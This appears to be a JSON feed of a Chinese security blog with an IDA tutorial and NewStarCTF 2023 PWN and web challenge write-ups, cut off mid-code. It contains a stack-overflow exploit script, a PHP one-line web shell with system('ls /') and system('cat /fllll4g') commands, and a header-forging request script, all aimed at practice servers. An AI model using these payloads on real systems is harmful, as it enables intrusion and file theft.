{
    "version": "https://jsonfeed.org/version/1",
    "title": "亚纳奇的Blog",
    "description": "一个不知名的小菜鸡",
    "home_page_url": "http://Yanagi-Kon.github.io",
    "items": [
        {
            "id": "http://yanagi-kon.github.io/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/",
            "url": "http://yanagi-kon.github.io/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/",
            "title": "IDA 使用",
            "date_published": "2023-10-05T09:06:00.000Z",
            "content_html": "<h2 id=\"ida-使用\"><a class=\"markdownIt-Anchor\" href=\"#ida-使用\">#</a> IDA 使用</h2>\n<p>建议去看<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMWVtNHkxUDdQTS8/c2hhcmVfc291cmNlPWNvcHlfd2ViJmFtcDt2ZF9zb3VyY2U9N2Q5NDgxMDFhMGVkNDczNzcyZTU4ZWVhMzdjNjFmOTQ=\">视频</span>，讲的很详细，很好。</p>\n<p>一般先找程序入口点，在  <code>Exports</code>  里面：</p>\n<p>![image-20231005103252765](IDA 使用 /image-20231005103252765.png)</p>\n<p>双击该内容  <code>start</code>  就可以直接定位到程序中的位置：</p>\n<p>![image-20231005103353127](IDA 使用 /image-20231005103353127.png)</p>\n<p>一般的，我们可以在  <code>option -&gt; general</code>  中将  <code>Stack Pointer</code>  和  <code>Auto comments</code>  打开，可以方便我们更好的查看源码的对应：</p>\n<p>![image-20231005103646708](IDA 使用 /image-20231005103646708.png)</p>\n<p>空格键可以切换视图效果：</p>\n<p>![image-20231005103807473](IDA 使用 /image-20231005103807473.png)</p>\n<p>切换过来后可以看到前面的地址以及段名称，如 <code>.text:00000000004010B0</code></p>\n<p>对着你想要反编译的内容 按  <code>F5</code> ，进行反编译：</p>\n<p>![image-20231005104011702](IDA 使用 /image-20231005104011702.png)</p>\n<p>可以在上面的页面中双击 main 进入到 main 函数中。</p>\n<p>右键  <code>Collapse declaration</code>  可以折叠变量，方便查看源码。</p>\n<p><code>N</code>  键可以用于重命名函数的变量名</p>\n<p><code>R</code>  键可以转换为字符模式显示</p>\n<p><code>H</code>  以数字或 16 进制显示</p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/",
            "url": "http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/",
            "title": "NewStarCTF 2023 公开赛道 PWN",
            "date_published": "2023-10-05T09:06:00.000Z",
            "content_html": "<h2 id=\"newstarctf-2023-公开赛道-pwn\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-pwn\">#</a> NewStarCTF 2023 公开赛道 PWN</h2>\n<h3 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<p><strong>考点：栈溢出，ret2txt</strong></p>\n<p>IDA 打开程序，找到主函数如下：</p>\n<p>![image-20231005150446089](NewStarCTF 2023 公开赛道 PWN/image-20231005150446089.png)</p>\n<p>发现是栈溢出类型的题目，在函数中也可以找到后门函数：</p>\n<p>![image-20231005150527611](NewStarCTF 2023 公开赛道 PWN/image-20231005150527611.png)</p>\n<p>利用 python 编写，直接填充字符覆盖返回地址为后门函数的地址即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25575</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"magic\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token number\">0x4011FB</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>backdoor<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#p64 (0) 是为了覆盖掉 ebp</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231005131606898](NewStarCTF 2023 公开赛道 PWN/image-20231005131606898.png)</p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/",
            "url": "http://yanagi-kon.github.io/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/",
            "title": "NewStarCTF 2023 公开赛道 WEB题目",
            "date_published": "2023-10-04T09:06:00.000Z",
            "content_html": "<h2 id=\"newstarctf-2023-公开赛道-web\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-web\">#</a> NewStarCTF 2023 公开赛道 WEB</h2>\n<h3 id=\"泄漏的秘密\"><a class=\"markdownIt-Anchor\" href=\"#泄漏的秘密\">#</a> 泄漏的秘密</h3>\n<p><strong>考点：敏感文件泄漏</strong></p>\n<p>通过盲猜 www.zip、index.php 等常用隐藏名称可以猜出。或者使用 dirsearch 进行搜索，可以查找到 www.zip 文件：</p>\n<p><img data-src=\"image-20231003102650464.png\" alt=\"image-20231003102650464\"></p>\n<p>进行访问下载解压即可获得两个文件，将两个文件中的字段拼接起来就是 flag： <code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p>\n<p><img data-src=\"image-20231003102104114.png\" alt=\"image-20231003102104114\"></p>\n<h3 id=\"begin-of-upload\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-upload\">#</a> Begin of Upload</h3>\n<p><strong>考点：php 文件上传漏洞</strong>，<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjk1Nw==\">一句话木马介绍</span></p>\n<p>编写含有一句话木马的文件命名为 1.php，内容为：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"it is ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>点击上传后会提示：</p>\n<p><img data-src=\"image-20231003103302992.png\" alt=\"image-20231003103302992\"></p>\n<p>改传 1.php.png，随后通过 Burp 拦截将上传内容修改为 1.php，上传成功：</p>\n<p><img data-src=\"image-20231003110326234.png\" alt=\"image-20231003110326234\"></p>\n<p>再利用 中国蚁剑 工具进行链接：</p>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>http<span class=\"token operator\">:</span><span class=\"token comment\">//eade7cdc-4610-4431-8fad-84e6f86ba897.node4.buuoj.cn:81/upload/1.php</span></pre></td></tr></table></figure><p><img data-src=\"image-20231003110436400.png\" alt=\"image-20231003110436400\"></p>\n<p>直接在蚁剑中找到 flag 文件 fllll4g：</p>\n<p><img data-src=\"image-20231003112917654.png\" alt=\"image-20231003112917654\"></p>\n<p>或者 使用 Hackbar，查看目录内容也可以得知含有 fllll4g 文件：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'ls /'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image-20231003113042254.png\" alt=\"image-20231003113042254\"></p>\n<p>再利用以下代码，得到 flag</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'cat /fllll4g'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"begin-of-http\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-http\">#</a> Begin of HTTP</h3>\n<p><strong>考点：HTTP 常见请求头、HTTP 请求方式</strong></p>\n<p>进入题目后，首先要求以 GET 方式给 ctf 参数传参数：</p>\n<p><img data-src=\"image-20231004093250416.png\" alt=\"image-20231004093250416\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//node4.buuoj.cn:29762/?ctf=1</span></span></pre></td></tr></table></figure><p>之后要求用 POST 方法传入 secret 参数，并且必须是正确的 secret：</p>\n<p><img data-src=\"image-20231004094638065.png\" alt=\"image-20231004094638065\"></p>\n<p>打开网页源代码可以找到 secret 提示：</p>\n<p><img data-src=\"image-20231004094715815.png\" alt=\"image-20231004094715815\"></p>\n<p>Base64 解码后得到 secret 参数：</p>\n<pre><code>n3wst4rCTF2023g00000d\n</code></pre>\n<p>利用 Hackbar 传入 POST 参数：</p>\n<p><img data-src=\"image-20231004094931704.png\" alt=\"image-20231004094931704\"></p>\n<p>下面更改 power 参数为 ctfer：</p>\n<p><img data-src=\"image-20231004095011586.png\" alt=\"image-20231004095011586\"></p>\n<p>再更改浏览器参数为 NewStarCTF2023：</p>\n<p><img data-src=\"image-20231004095107075.png\" alt=\"image-20231004095107075\"></p>\n<p>之后加入 Refer 参数，并修改为 <span class=\"exturl\" data-url=\"aHR0cDovL25ld3N0YXJjdGYuY29t\">newstarctf.com</span>：</p>\n<p><img data-src=\"image-20231004095225805.png\" alt=\"image-20231004095225805\"></p>\n<p>加入 X-Real-IP 参数为 127.0.0.1，修改为本地用户访问：</p>\n<p><img data-src=\"image-20231004095445708.png\" alt=\"image-20231004095445708\"></p>\n<p>得到最终的 flag 值： <code>flag&#123;46df0dd3-dd02-4402-9e1e-08e555917442&#125;</code></p>\n<p><strong>另：</strong></p>\n<p>本题还可以使用 Burp 等工具进行修改参数，还可以使用 Python 进行求解：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> requests <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> base64 <span class=\"token keyword\">import</span> b64decode</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://node4.buuoj.cn:29762/'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>params <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">'ctf'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">'secret'</span><span class=\"token punctuation\">:</span> b64decode<span class=\"token punctuation\">(</span><span class=\"token string\">'bjN3c3Q0ckNURjIwMjNnMDAwMDBk'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cookies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">'power'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'ctfer'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'NewStarCTF2023'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token string\">'Referer'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'newstarctf.com'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'X-Real-IP'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'localhost'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s <span class=\"token operator\">=</span> Session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>r <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> params<span class=\"token operator\">=</span>params<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>cookies<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get_dict<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>输出为：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Begin of HTTP<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/style.css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/style.css<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token selector\">body</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #16a085<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span> hidden<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token selector\">canvas</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> -1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/jquery.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/verificationNumbers.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/verificationNumbers.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/Particleground.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/Particleground.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">$</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">ready</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">particleground</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token literal-property property\">dotColor</span><span class=\"token operator\">:</span> <span class=\"token string\">'#5cbdaa'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token literal-property property\">lineColor</span><span class=\"token operator\">:</span> <span class=\"token string\">'#5cbdaa'</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>ß</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dl</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>admin_login<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dt</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>font</span> <span class=\"token attr-name\">color</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>white<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>strong</span><span class=\"token punctuation\">></span></span>Welcome to NewStarCTF 2023~<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>strong</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>font</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dt</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>font</span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>4px<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">color</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>white<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>恭喜你顺利完成了本道题目，这是你的Flag，快去提交吧：flag&#123;46df0dd3-dd02-4402-9e1e-08e555917442&#125;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>font</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dl</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>&#123;&#125;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>&#123;'Connection': 'close', 'Content-Length': '666', 'Content-Encoding': 'gzip', 'Content-Type': 'text/html; charset=UTF-8', 'Date': 'Wed, 04 Oct 2023 01:58:05 GMT', 'Server': 'Apache/2.4.38 (Debian)', 'Vary': 'Accept-Encoding', 'X-Powered-By': 'PHP/7.3.15'&#125;</pre></td></tr></table></figure><h3 id=\"errorflask\"><a class=\"markdownIt-Anchor\" href=\"#errorflask\">#</a> ErrorFlask</h3>\n<p><strong>考点：Flask 报错界面信息泄露</strong></p>\n<p>题目如下所示：</p>\n<p><img data-src=\"image-20231004100749405.png\" alt=\"image-20231004100749405\"></p>\n<p>它说我们只用给出 number1 和 number2，它会帮我们添加，于是：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//69dd29c8-0844-4ff3-aaef-ec632f65b4bc.node4.buuoj.cn:81/?number1=ab&amp;number2=2</span></span></pre></td></tr></table></figure><p><img data-src=\"image-20231004101424500.png\" alt=\"image-20231004101424500\"></p>\n<p>从中进行查找可以查看到 flag：</p>\n<p><img data-src=\"image-20231004101624946.png\" alt=\"image-20231004101624946\"></p>\n<p><code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p>\n<h3 id=\"begin-of-php\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-php\">#</a> Begin of PHP</h3>\n<p><strong>考点：PHP 弱类型、PHP 加密函数数组绕过、PHP 函数特性、变量覆盖漏洞</strong></p>\n<p><img data-src=\"image-20231004103006040.png\" alt=\"image-20231004103006040\"></p>\n<p>本题一共分出了五个部分。</p>\n<p>第一个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token 